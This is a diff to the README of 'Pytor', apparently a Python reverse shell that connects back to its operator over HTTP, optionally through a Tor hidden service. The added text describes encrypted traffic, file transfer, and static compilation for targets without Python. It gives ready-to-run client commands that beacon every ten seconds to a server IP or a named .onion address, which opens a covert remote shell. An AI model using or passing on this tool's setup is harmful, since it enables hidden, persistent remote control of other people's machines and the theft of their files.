@@ -1,10 +1,31 @@
 Pytor
 -----
-A very simple http connect back shell that connects to
+A very simple http connect back shell that also can connect to
 a Tor hidden service.
 
-It uses a http proxy to connect to the Tor network
-without implementing the full protocol.
+
+Features
+--------
+* The connection is encrypted using symetric encryption (Blowfish).
+The password is randomly generated per connection and transmitted
+using asymmetric encription (RSA). The implementation of both algorithms
+is in pure Python.
+
+
+* File upload and download. Since it is written entirely in Python,
+  the encryption algorithms are inefficient and extremly costly. Hence,
+  transmitting larges files is not possible. The binary will use all the
+  resources available for a long period of time.
+
+
+* It is possible to compile the Python code to native code and sometimes
+  it can be compiled statically (depending on the user settings). This is
+  particularly interesting if there is not Python interpreter in the target
+  machine.
+
+
+* It can use a http proxy to connect to the Tor network without implementing
+  the full protocol.
 
 
 Disclaimer
@@ -24,7 +45,8 @@ Before using this reverse shell, a new pair of keys must be
 generated. This can be done by executing this script:
 src/gen_rsa_keys.py. Once we have the keys, the variables
 public and private in both scripts must be modified with
-the new keys.
+the new keys. (TO BE INTEGRATED IN THE MAIN CODE. IT IS NOT
+CURRENTLY WORKING)
 
 * Server: 
 The user must install Tor in a computer and setup a hidden
@@ -48,12 +70,42 @@ you configured in your computer.
 
 Usage
 -----
-The server runs without parameters and it will prompt for
-commands as soon as a client connects back. The client connects
-just one time in case it is called without parameters, but
-this behavior can be changed with the -c flag.
+Pytor is configured by exporting environment variables.
 
-Use the command "quit" to finish the client execution.
+- Server mode:
+  The server will listen in any IP address, port 8080
+  * SERVER_MODE="yes"
+
+- Client mode:
+  * NEXT_REQUEST="10"
+    The client sleeps 10 seconds between connections
+    to the server. The special value -1 indicates there is no
+    next request (default).
+
+  * PYSERVER_IP="127.0.0.1"
+    IP address of the server. Default 127.0.0.1
+
+  * PYSERVER_PORT="8080"
+    Port where the server is waiting for connections.
+    Default 8080.
+
+  * HIDDEN="o3mco5aw544ls6du.onion"
+    Hidden service to be used when running in Tor mode.
+
+  * TOR_MODE="yes"
+    Connects through a tor proxy instead of a direct connection.
+
+Examples:
+
+- Standard client
+  foo@bar:/src/ $ NEXT_REQUEST="10" PYSERVER_IP="127.0.0.1" PYSERVER_PORT="8080" ./pytor.py
+
+- Client running in Tor Mode
+  foo@bar:/src/ $ NEXT_REQUEST="10" HIDDEN="o3mco5aw544ls6du.onion" ./pytor.py
+
+- Server mode
+  foo@bar:/src/ $ SERVER_MODE="yes" ./pytor.py
+
 
 
 Freezing Pytor
@@ -64,6 +116,12 @@ compiled and the binaries copied to the bin subdirectory.
 
 Gotcha
 ------
-The client may experience problems when connecting to the
-server in case your Tor tunnel is too slow. It happens because
-the proxy server has a low time out.
+- The client may experience problems when connecting to the
+  server in case your Tor tunnel is too slow. It happens because
+  the proxy server has a low time out.
+
+- Sometimes the compiled binary will not run if it was frozen under
+  Python 2.4 without readline. It also depends on how the Python
+  interpreter was compiled in order statically compile Pytor. It
+  works on Debian like systems but not in RedHat like systems
+  (CentOS or Fedora).
